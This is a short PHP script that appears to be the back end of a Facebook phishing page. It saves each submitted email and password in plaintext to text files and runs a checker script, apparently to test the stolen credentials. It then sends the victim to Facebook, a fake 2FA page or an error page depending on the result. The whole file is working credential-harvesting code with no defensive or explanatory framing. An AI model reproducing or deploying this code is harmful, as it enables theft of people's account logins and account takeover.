<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . " \n", FILE_APPEND);
shell_exec("python3 checker.py");
$check_result = file_get_contents("check.txt");
if ($check_result == 1) {
	header('Location: https://mbasic.facebook.com/profile');
	file_put_contents("verified.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . " Verify: True\n", FILE_APPEND);
}
elseif ($check_result == 2) {
	header('Location: 2FA.html');
	file_put_contents("verified.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . " Verify: 2FA\n", FILE_APPEND);
}
else {
	header('Location: error.html');
	file_put_contents("verified.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . " Verify: False\n", FILE_APPEND);
}

unlink("check.txt");

exit();

?>
